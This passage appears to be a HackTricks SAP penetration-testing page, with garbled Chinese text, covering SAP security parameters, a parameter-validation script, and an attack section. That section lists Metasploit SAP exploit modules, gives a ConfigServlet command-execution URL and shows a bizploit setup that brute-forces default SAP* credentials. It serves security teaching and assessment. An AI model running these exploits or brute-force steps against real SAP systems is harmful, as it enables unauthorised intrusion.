<tr><td><code>login/min_password_letters</code></td><td><code>1</code></td><td>å¯†ç ä¸­è¦æ±‚çš„å­—æ¯çš„æœ€å°æ•°é‡ã€‚</td></tr>
<tr><td><code>login/fails_to_user_lock</code></td><td><code>&lt;5</code></td><td>é”å®šç”¨æˆ·å¸æˆ·ä¹‹å‰çš„å¤±è´¥ç™»å½•å°è¯•æ¬¡æ•°ã€‚</td></tr>
<tr><td><code>login/password_expiration_time</code></td><td><code>&gt;90</code></td><td>å¯†ç è¿‡æœŸæ—¶é—´ï¼ˆå¤©ï¼‰ã€‚</td></tr>
<tr><td><code>login/password_max_idle_initial</code></td><td><code>&lt;14</code></td><td>è¦æ±‚å¯†ç é‡æ–°è¾“å…¥ä¹‹å‰çš„æœ€å¤§ç©ºé—²æ—¶é—´ï¼ˆåˆå§‹ï¼‰ã€‚</td></tr>
<tr><td><code>login/password_max_idle_productive</code></td><td><code>&lt;180</code></td><td>è¦æ±‚å¯†ç é‡æ–°è¾“å…¥ä¹‹å‰çš„æœ€å¤§ç©ºé—²æ—¶é—´ï¼ˆç”Ÿäº§ï¼‰ã€‚</td></tr>
<tr><td><code>login/password_downwards_compatibility</code></td><td><code>0</code></td><td>æŒ‡å®šæ˜¯å¦å¯ç”¨å¯†ç çš„å‘ä¸‹å…¼å®¹æ€§ã€‚</td></tr>
<tr><td><code>rfc/reject_expired_passwd</code></td><td><code>0</code></td><td>ç¡®å®šæ˜¯å¦æ‹’ç» RFCï¼ˆè¿œç¨‹åŠŸèƒ½è°ƒç”¨ï¼‰çš„è¿‡æœŸå¯†ç ã€‚</td></tr>
<tr><td><code>rsau/enable</code></td><td><code>0</code></td><td>å¯ç”¨æˆ–ç¦ç”¨ RS AUï¼ˆæˆæƒï¼‰æ£€æŸ¥ã€‚</td></tr>
<tr><td><code>rdisp/gui_auto_logout</code></td><td><code>&lt;5</code></td><td>æŒ‡å®šè‡ªåŠ¨æ³¨é”€ GUI ä¼šè¯ä¹‹å‰çš„æ—¶é—´ï¼ˆåˆ†é’Ÿï¼‰ã€‚</td></tr>
<tr><td><code>service/protectedwebmethods</code></td><td><code>SDEFAULT</code></td><td>æŒ‡å®šå—ä¿æŠ¤çš„ Web æ–¹æ³•çš„é»˜è®¤è®¾ç½®ã€‚</td></tr>
<tr><td><code>snc/enable</code></td><td><code>0</code></td><td>å¯ç”¨æˆ–ç¦ç”¨å®‰å…¨ç½‘ç»œé€šä¿¡ï¼ˆSNCï¼‰ã€‚</td></tr>
<tr><td><code>ucon/rfc/active</code></td><td><code>0</code></td><td>æ¿€æ´»æˆ–åœç”¨ UCONï¼ˆç»Ÿä¸€è¿æ¥ï¼‰RFCã€‚</td></tr>
</tbody></table>
</div>
<h2 id="å‚æ•°æ£€æŸ¥è„šæœ¬"><a class="header" href="#å‚æ•°æ£€æŸ¥è„šæœ¬">å‚æ•°æ£€æŸ¥è„šæœ¬</a></h2>
<p>ç”±äºå‚æ•°æ•°é‡è¾ƒå¤šï¼Œæ‚¨è¿˜å¯ä»¥å°†æ‰€æœ‰å‚æ•°å¯¼å‡ºåˆ° .XML æ–‡ä»¶ï¼Œå¹¶ä½¿ç”¨è„šæœ¬ <a href="https://github.com/damianStrojek/SAPPV">SAPPV (SAP Parameter Validator)</a>ï¼Œè¯¥è„šæœ¬å°†æ£€æŸ¥ä¸Šè¿°æ‰€æœ‰å‚æ•°å¹¶æ‰“å°å…¶å€¼åŠé€‚å½“çš„åŒºåˆ†ã€‚</p>
<pre><code>./SAPPV.sh EXPORT.XML

Parameter: auth/no_check_in_some_cases
User-Defined Value: No data
System Default Value: Y
Comment: Activation of the Profile Generator
Vulnerability: "SAP Parameter Misconfiguration: auth/no_check_in_some_cases"

Parameter: auth/object_disabling_active
User-Defined Value: N
System Default Value: N
Comment: Value 'N' prohibits disabling of authorization objects
Vulnerability: "SAP Parameter Misconfiguration: auth/object_disabling_active"

Parameter: auth/rfc_authority_check
User-Defined Value: 6
System Default Value: 6
Comment: Execution option for the RFC authority check
Vulnerability: "SAP Parameter Misconfiguration: auth/rfc_authority_check"

Parameter: bdc/bdel_auth_check
User-Defined Value: No data
System Default Value: FALSE
Comment: batch-input: check authorisation for activity DELE when delete TA
Vulnerability: "SAP Parameter Misconfiguration: bdc/bdel_auth_check"

[...]
</code></pre>
<h1 id="æ”»å‡»"><a class="header" href="#æ”»å‡»">æ”»å‡»ï¼</a></h1>
<ul>
<li>æ£€æŸ¥å®ƒæ˜¯å¦è¿è¡Œåœ¨æ—§æœåŠ¡å™¨æˆ–æŠ€æœ¯ä¸Šï¼Œå¦‚ Windows 2000ã€‚</li>
<li>è®¡åˆ’å¯èƒ½çš„åˆ©ç”¨ / æ”»å‡»ï¼Œé’ˆå¯¹ SAP å‘ç°æœ‰å¾ˆå¤š Metasploit æ¨¡å—ï¼ˆè¾…åŠ©æ¨¡å—ï¼‰å’Œåˆ©ç”¨ï¼š</li>
</ul>
<pre><code class="language-text">msf &gt; search sap
Matching Modules
================
Name                                                                     Disclosure Date  Rank       Description
----                                                                     ---------------  ----       -----------
auxiliary/admin/maxdb/maxdb_cons_exec                                    2008-01-09       normal     SAP MaxDB cons.exe Remote Command Injection
auxiliary/admin/sap/sap_configservlet_exec_noauth                        2012-11-01       normal     SAP ConfigServlet OS Command Execution
auxiliary/admin/sap/sap_mgmt_con_osexec                                                   normal     SAP Management Console OSExecute
auxiliary/dos/sap/sap_soap_rfc_eps_delete_file                                            normal     SAP SOAP EPS_DELETE_FILE File Deletion
auxiliary/dos/windows/http/pi3web_isapi                                  2008-11-13       normal     Pi3Web ISAPI DoS
auxiliary/dos/windows/llmnr/ms11_030_dnsapi                              2011-04-12       normal     Microsoft Windows DNSAPI.dll LLMNR Buffer Underrun DoS
auxiliary/scanner/http/sap_businessobjects_user_brute                                     normal     SAP BusinessObjects User Bruteforcer
auxiliary/scanner/http/sap_businessobjects_user_brute_web                                 normal     SAP BusinessObjects Web User Bruteforcer
auxiliary/scanner/http/sap_businessobjects_user_enum                                      normal     SAP BusinessObjects User Enumeration
auxiliary/scanner/http/sap_businessobjects_version_enum                                   normal     SAP BusinessObjects Version Detection
auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt                                    normal     SAP CTC Service Verb Tampering User Management
auxiliary/scanner/sap/sap_hostctrl_getcomputersystem                                      normal     SAP Host Agent Information Disclosure
auxiliary/scanner/sap/sap_icf_public_info                                                 normal     SAP ICF /sap/public/info Service Sensitive Information Gathering
auxiliary/scanner/sap/sap_icm_urlscan                                                     normal     SAP URL Scanner
auxiliary/scanner/sap/sap_mgmt_con_abaplog                                                normal     SAP Management Console ABAP Syslog Disclosure
auxiliary/scanner/sap/sap_mgmt_con_brute_login                                            normal     SAP Management Console Brute Force
auxiliary/scanner/sap/sap_mgmt_con_extractusers                                           normal     SAP Management Console Extract Users
auxiliary/scanner/sap/sap_mgmt_con_getaccesspoints                                        normal     SAP Management Console Get Access Points
auxiliary/scanner/sap/sap_mgmt_con_getenv                                                 normal     SAP Management Console getEnvironment
auxiliary/scanner/sap/sap_mgmt_con_getlogfiles                                            normal     SAP Management Console Get Logfile
auxiliary/scanner/sap/sap_mgmt_con_getprocesslist                                         normal     SAP Management Console GetProcessList
auxiliary/scanner/sap/sap_mgmt_con_getprocessparameter                                    normal     SAP Management Console Get Process Parameters
auxiliary/scanner/sap/sap_mgmt_con_instanceproperties                                     normal     SAP Management Console Instance Properties
auxiliary/scanner/sap/sap_mgmt_con_listlogfiles                                           normal     SAP Management Console List Logfiles
auxiliary/scanner/sap/sap_mgmt_con_startprofile                                           normal     SAP Management Console getStartProfile
auxiliary/scanner/sap/sap_mgmt_con_version                                                normal     SAP Management Console Version Detection
auxiliary/scanner/sap/sap_router_info_request                                             normal     SAPRouter Admin Request
auxiliary/scanner/sap/sap_router_portscanner                                              normal     SAPRouter Port Scanner
auxiliary/scanner/sap/sap_service_discovery                                               normal     SAP Service Discovery
auxiliary/scanner/sap/sap_smb_relay                                                       normal     SAP SMB Relay Abuse
auxiliary/scanner/sap/sap_soap_bapi_user_create1                                          normal     SAP /sap/bc/soap/rfc SOAP Service BAPI_USER_CREATE1 Function User Creation
auxiliary/scanner/sap/sap_soap_rfc_brute_login                                            normal     SAP SOAP Service RFC_PING Login Brute Forcer
auxiliary/scanner/sap/sap_soap_rfc_dbmcli_sxpg_call_system_command_exec                   normal     SAP /sap/bc/soap/rfc SOAP Service SXPG_CALL_SYSTEM Function Command Injection
auxiliary/scanner/sap/sap_soap_rfc_dbmcli_sxpg_command_exec                               normal     SAP /sap/bc/soap/rfc SOAP Service SXPG_COMMAND_EXEC Function Command Injection
auxiliary/scanner/sap/sap_soap_rfc_eps_get_directory_listing                              normal     SAP SOAP RFC EPS_GET_DIRECTORY_LISTING Directories Information Disclosure
auxiliary/scanner/sap/sap_soap_rfc_pfl_check_os_file_existence                            normal     SAP SOAP RFC PFL_CHECK_OS_FILE_EXISTENCE File Existence Check
auxiliary/scanner/sap/sap_soap_rfc_ping                                                   normal     SAP /sap/bc/soap/rfc SOAP Service RFC_PING Function Service Discovery
auxiliary/scanner/sap/sap_soap_rfc_read_table                                             normal     SAP /sap/bc/soap/rfc SOAP Service RFC_READ_TABLE Function Dump Data
auxiliary/scanner/sap/sap_soap_rfc_rzl_read_dir                                           normal     SAP SOAP RFC RZL_READ_DIR_LOCAL Directory Contents Listing
auxiliary/scanner/sap/sap_soap_rfc_susr_rfc_user_interface                                normal     SAP /sap/bc/soap/rfc SOAP Service SUSR_RFC_USER_INTERFACE Function User Creation
auxiliary/scanner/sap/sap_soap_rfc_sxpg_call_system_exec                                  normal     SAP /sap/bc/soap/rfc SOAP Service SXPG_CALL_SYSTEM Function Command Execution
auxiliary/scanner/sap/sap_soap_rfc_sxpg_command_exec                                      normal     SAP SOAP RFC SXPG_COMMAND_EXECUTE
auxiliary/scanner/sap/sap_soap_rfc_system_info                                            normal     SAP /sap/bc/soap/rfc SOAP Service RFC_SYSTEM_INFO Function Sensitive Information Gathering
auxiliary/scanner/sap/sap_soap_th_saprel_disclosure                                       normal     SAP /sap/bc/soap/rfc SOAP Service TH_SAPREL Function Information Disclosure
auxiliary/scanner/sap/sap_web_gui_brute_login                                             normal     SAP Web GUI Login Brute Forcer
exploit/multi/sap/sap_mgmt_con_osexec_payload                            2011-03-08       excellent  SAP Management Console OSExecute Payload Execution
exploit/multi/sap/sap_soap_rfc_sxpg_call_system_exec                     2013-03-26       great      SAP SOAP RFC SXPG_CALL_SYSTEM Remote Command Execution
exploit/multi/sap/sap_soap_rfc_sxpg_command_exec                         2012-05-08       great      SAP SOAP RFC SXPG_COMMAND_EXECUTE Remote Command Execution
exploit/windows/browser/enjoysapgui_comp_download                        2009-04-15       excellent  EnjoySAP SAP GUI ActiveX Control Arbitrary File Download
exploit/windows/browser/enjoysapgui_preparetoposthtml                    2007-07-05       normal     EnjoySAP SAP GUI ActiveX Control Buffer Overflow
exploit/windows/browser/sapgui_saveviewtosessionfile                     2009-03-31       normal     SAP AG SAPgui EAI WebViewer3D Buffer Overflow
exploit/windows/http/sap_configservlet_exec_noauth                       2012-11-01       great      SAP ConfigServlet Remote Code Execution
exploit/windows/http/sap_host_control_cmd_exec                           2012-08-14       average    SAP NetWeaver HostControl Command Injection
exploit/windows/http/sapdb_webtools                                      2007-07-05       great      SAP DB 7.4 WebTools Buffer Overflow
exploit/windows/lpd/saplpd                                               2008-02-04       good       SAP SAPLPD 6.28 Buffer Overflow
exploit/windows/misc/sap_2005_license                                    2009-08-01       great      SAP Business One License Manager 2005 Buffer Overflow
exploit/windows/misc/sap_netweaver_dispatcher                            2012-05-08       normal     SAP NetWeaver Dispatcher DiagTraceR3Info Buffer Overflow
</code></pre>
<ul>
<li>å°è¯•ä½¿ç”¨ä¸€äº›å·²çŸ¥çš„æ¼æ´ï¼ˆæŸ¥çœ‹ Exploit-DBï¼‰æˆ–æ”»å‡»ï¼Œä¾‹å¦‚åœ¨ SAP Portal ä¸­çš„ç»å…¸â€œSAP ConfigServlet è¿œç¨‹ä»£ç æ‰§è¡Œâ€ï¼š</li>
</ul>
<pre><code class="language-text">http://example.com:50000/ctc/servlet/com.sap.ctc.util.ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=uname -a
</code></pre>
<p><img src="https://raw.githubusercontent.com/shipcod3/mySapAdventures/master/screengrabs/sap_rce.jpeg" alt="SAP Config Servlet RCE" /></p>
<ul>
<li>åœ¨å‘ç°é˜¶æ®µè¿è¡Œ bizploit è„šæœ¬çš„ <code>start</code> å‘½ä»¤ä¹‹å‰ï¼Œæ‚¨è¿˜å¯ä»¥æ·»åŠ ä»¥ä¸‹å†…å®¹ä»¥æ‰§è¡Œæ¼æ´è¯„ä¼°ï¼š</li>
</ul>
<pre><code class="language-text">bizploit&gt; plugins
bizploit/plugins&gt; vulnassess all
bizploit/plugins&gt; vulnassess config bruteLogin
bizploit/plugins/vulnassess/config:bruteLogin&gt; set type defaultUsers
bizploit/plugins/vulnassess/config:bruteLogin&gt; set tryHardcodedSAPStar True
bizploit/plugins/vulnassess/config:bruteLogin&gt; set tryUserAsPwd True
bizploit/plugins/vulnassess/config:bruteLogin&gt; back
bizploit/plugins&gt; vulnassess config registerExtServer
bizploit/plugins/vulnassess/config:registerExtServer&gt; set tpname evilgw
bizploit/plugins/vulnassess/config:registerExtServer&gt; back
bizploit/plugins&gt; vulnassess config checkRFCPrivs
bizploit/plugins/vulnassess/config:checkRFCPrivs&gt; set checkExtOSCommands True
bizploit/plugins/vulnassess/config:checkRFCPrivs&gt; back
bizploit/plugins&gt; vulnassess config icmAdmin
bizploit/plugins/vulnassess/config:icmAdmin&gt; set adminURL /sap/admin
bizploit/plugins/vulnassess/config:icmAdmin&gt; back
bizploit/plugins&gt; start
bizploit/plugins&gt; back
bizploit&gt; start
</code></pre>
<h1 id="å…¶ä»–æœ‰ç”¨çš„æµ‹è¯•å·¥å…·"><a class="header" href="#å…¶ä»–æœ‰ç”¨çš„æµ‹è¯•å·¥å…·">å…¶ä»–æœ‰ç”¨çš„æµ‹è¯•å·¥å…·</a></h1>
<ul>
<li><a href="https://github.com/airbus-seclab/powersap">PowerSAP</a> - ç”¨äºè¯„ä¼°SAPå®‰å…¨æ€§çš„Powershellå·¥å…·</li>
<li><a href="https://portswigger.net/burp">Burp Suite</a> - ç›®å½•æ¨¡ç³Šæµ‹è¯•å’Œç½‘ç»œå®‰å…¨è¯„ä¼°çš„å¿…å¤‡å·¥å…·</li>
<li><a href="https://github.com/SecureAuthCorp/pysap">pysap</a> - ç”¨äºæ„é€ SAPç½‘ç»œåè®®æ•°æ®åŒ…çš„Pythonåº“</li>
<li><a href="https://github.com/gelim/nmap-erpscan">https://github.com/gelim/nmap-erpscan</a> - å¸®åŠ©nmapæ£€æµ‹SAP/ERP</li>
</ul>
<h2 id="å‚è€ƒæ–‡çŒ®"><a class="header" href="#å‚è€ƒæ–‡çŒ®">å‚è€ƒæ–‡çŒ®</a></h2>
<ul>
<li><a href="http://information.rapid7.com/rs/rapid7/images/SAP%20Penetration%20Testing%20Using%20Metasploit%20Final.pdf">ä½¿ç”¨Metasploitè¿›è¡ŒSAPæ¸—é€æµ‹è¯•</a></li>
<li><a href="https://github.com/davehardy20/SAP-Stuff">https://github.com/davehardy20/SAP-Stuff</a> - ä¸€ä¸ªåŠè‡ªåŠ¨åŒ–Bizploitçš„è„šæœ¬</li>
<li><a href="https://erpscan.com/press-center/blog/sap-netweaver-abap-security-configuration-part-2-default-passwords-for-access-to-the-application/">SAP NetWeaver ABAPå®‰å…¨é…ç½®ç¬¬3éƒ¨åˆ†ï¼šè®¿é—®åº”ç”¨ç¨‹åºçš„é»˜è®¤å¯†ç </a></li>
<li><a href="https://wiki.scn.sap.com/wiki/display/Security/List+of+ABAP-transaction+codes+related+to+SAP+security">ä¸SAPå®‰å…¨ç›¸å…³çš„ABAPäº‹åŠ¡ä»£ç åˆ—è¡¨</a></li>
<li><a href="https://erpscan.com/wp-content/uploads/presentations/2012-HackerHalted-Breaking-SAP-Portal.pdf">ç ´è§£SAPé—¨æˆ·</a></li>
<li><a href="https://erpscan.com/wp-content/uploads/presentations/2012-Kuwait-InfoSecurity-Top-10-most-interesting-vulnerabilities-and-attacks-in-SAP.pdf">åå¤§æœ€æœ‰è¶£çš„SAPæ¼æ´å’Œæ”»å‡»</a></li>
<li><a href="https://www.onapsis.com/blog/assessing-security-sap-ecosystems-bizploit-discovery">ä½¿ç”¨Bizploitè¯„ä¼°SAPç”Ÿæ€ç³»ç»Ÿçš„å®‰å…¨æ€§ï¼šå‘ç°</a></li>
<li><a href="https://www.exploit-db.com/docs/43859">https://www.exploit-db.com/docs/43859</a></li>
<li><a href="https://resources.infosecinstitute.com/topic/pen-stesting-sap-applications-part-1/">https://resources.infosecinstitute.com/topic/pen-stesting-sap-applications-part-1/</a></li>
<li><a href="https://github.com/shipcod3/mySapAdventures">https://github.com/shipcod3/mySapAdventures</a></li>
</ul>
<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
<p>{% embed url="https://websec.nl/" %}</p>
<p>{% hint style="success" %}
å­¦ä¹ å’Œå®è·µAWSé»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricksåŸ¹è®­AWSçº¢é˜Ÿä¸“å®¶ï¼ˆARTEï¼‰</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ å’Œå®è·µGCPé»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricksåŸ¹è®­GCPçº¢é˜Ÿä¸“å®¶ï¼ˆGRTEï¼‰</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒHackTricks</summary>
<ul>
<li>æŸ¥çœ‹<a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discordç¾¤ç»„</strong></a>æˆ–<a href="https://t.me/peass"><strong>ç”µæŠ¥ç¾¤ç»„</strong></a>æˆ–<strong>åœ¨</strong> <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a>å’Œ<a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHubåº“æäº¤PRåˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../http://hacking-printers.net/wiki/index.php/Main_Page.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../network-services-pentesting/pentesting-voip/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../http://hacking-printers.net/wiki/index.php/Main_Page.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../network-services-pentesting/pentesting-voip/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../elasticlunr.min.js"></script>
        <script src="../mark.min.js"></script>
        <script src="../searcher.js"></script>

        <script src="../clipboard.min.js"></script>
        <script src="../highlight.js"></script>
        <script src="../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
